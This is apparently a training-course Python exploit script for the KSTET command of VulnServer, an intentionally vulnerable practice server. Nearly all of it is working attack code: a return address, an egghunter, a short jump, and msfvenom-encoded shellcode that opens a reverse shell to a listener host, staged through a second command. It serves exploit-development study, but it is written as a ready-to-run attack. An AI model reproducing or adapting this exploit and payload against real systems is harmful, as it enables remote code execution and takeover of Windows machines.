#!/usr/bin/python

#
# This python script is to be used for VulnServer kstet exploitation
# I created it during following CTP training
# It is a modification from the fuzzing script, uses an egghunter and multiple vulnserver parameters
# enjoy!
#
import socket
import os
import sys
import time
#

#
# Three Arguments for all our VulnServer exploits, including the script itself. 
# Not going to need this so much
if len(sys.argv) != 3:
    print "[-] Usage: ./thisfile.py <ip> <port>\n" 
    print "[-] Example: ./thisfile.py 192.168.1.66 9999\n"
    print "[-] Try Harder!\n"
    sys.exit()


print "[-] Hello, looks like you survived the parameter quiz!\n"
print "[-] This script sends a reverse shell after overflowing Vulnserver KSTET\n"
print "[-] Listener needs to be up and running!\n"
#print "[-] You can change it to something else if you want!\n"
time.sleep(3)
#
# Define the script arguments.
#
ip = sys.argv[1]
port = int(sys.argv[2])

#
# Exploit specific values
#
jesp = "\xaf\x11\x50\x62" #Yeah I took the first one I saw.
egg = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
sled = "\x90"*8
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.112 LPORT=19397 -b "\x00]x0a\x0d\x20" -f py EXITFUNC=seh | sed 's/buf/pay/g'
# TESTED against Windows 7 & XP
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 11 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of py file: 1684 bytes
# The Payload follows
#
pay = "GDOG "
pay +=  "T00WT00W"
pay += sled
pay += "\xbf\xa1\x2f\x1f\x73\xd9\xc6\xd9\x74\x24\xf4\x5a\x33"
pay += "\xc9\xb1\x52\x83\xea\xfc\x31\x7a\x0e\x03\xdb\x21\xfd"
pay += "\x86\xe7\xd6\x83\x69\x17\x27\xe4\xe0\xf2\x16\x24\x96"
pay += "\x77\x08\x94\xdc\xd5\xa5\x5f\xb0\xcd\x3e\x2d\x1d\xe2"
pay += "\xf7\x98\x7b\xcd\x08\xb0\xb8\x4c\x8b\xcb\xec\xae\xb2"
pay += "\x03\xe1\xaf\xf3\x7e\x08\xfd\xac\xf5\xbf\x11\xd8\x40"
pay += "\x7c\x9a\x92\x45\x04\x7f\x62\x67\x25\x2e\xf8\x3e\xe5"
pay += "\xd1\x2d\x4b\xac\xc9\x32\x76\x66\x62\x80\x0c\x79\xa2"
pay += "\xd8\xed\xd6\x8b\xd4\x1f\x26\xcc\xd3\xff\x5d\x24\x20"
pay += "\x7d\x66\xf3\x5a\x59\xe3\xe7\xfd\x2a\x53\xc3\xfc\xff"
pay += "\x02\x80\xf3\xb4\x41\xce\x17\x4a\x85\x65\x23\xc7\x28"
pay += "\xa9\xa5\x93\x0e\x6d\xed\x40\x2e\x34\x4b\x26\x4f\x26"
pay += "\x34\x97\xf5\x2d\xd9\xcc\x87\x6c\xb6\x21\xaa\x8e\x46"
pay += "\x2e\xbd\xfd\x74\xf1\x15\x69\x35\x7a\xb0\x6e\x3a\x51"
pay += "\x04\xe0\xc5\x5a\x75\x29\x02\x0e\x25\x41\xa3\x2f\xae"
pay += "\x91\x4c\xfa\x61\xc1\xe2\x55\xc2\xb1\x42\x06\xaa\xdb"
pay += "\x4c\x79\xca\xe4\x86\x12\x61\x1f\x41\xdd\xde\x1e\xe1"
pay += "\xb5\x1c\x20\x4a\x83\xa8\xc6\x26\x1b\xfd\x51\xdf\x82"
pay += "\xa4\x29\x7e\x4a\x73\x54\x40\xc0\x70\xa9\x0f\x21\xfc"
pay += "\xb9\xf8\xc1\x4b\xe3\xaf\xde\x61\x8b\x2c\x4c\xee\x4b"
pay += "\x3a\x6d\xb9\x1c\x6b\x43\xb0\xc8\x81\xfa\x6a\xee\x5b"
pay += "\x9a\x55\xaa\x87\x5f\x5b\x33\x45\xdb\x7f\x23\x93\xe4"
pay += "\x3b\x17\x4b\xb3\x95\xc1\x2d\x6d\x54\xbb\xe7\xc2\x3e"
pay += "\x2b\x71\x29\x81\x2d\x7e\x64\x77\xd1\xcf\xd1\xce\xee"
pay += "\xe0\xb5\xc6\x97\x1c\x26\x28\x42\xa5\x58\xd8\x5e\x30"
pay += "\xcc\x43\x0b\x79\x90\x73\xe6\xbe\xad\xf7\x02\x3f\x4a"
pay += "\xe7\x67\x3a\x16\xaf\x94\x36\x07\x5a\x9a\xe5\x28\x4f"
pay += "\n"

# Define the variable "crash"

crash="\x90"*10
crash+=egg
crash+="\x90"*24
crash+=jesp
crash+="\x90\x90\xeb\xbd" # This is stage 1 to get out of a tight spot! I had to adjust it twice to get it into the NOPs and not the middle of the egghunter
crash+="\xcc"*16

buffer="KSTET"
buffer+=" /.:/" 
buffer+=crash + "\n"

print "[-] Here we going, sending the exploit %s bytes " %len(crash)
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
time.sleep(.25)
expl.send(pay)
print expl.recv(1024)
time.sleep(.25)
expl.send(buffer)

time.sleep(.25)
expl.close
time.sleep(.5)

print "[-] Sent, check listener\n"

exit()
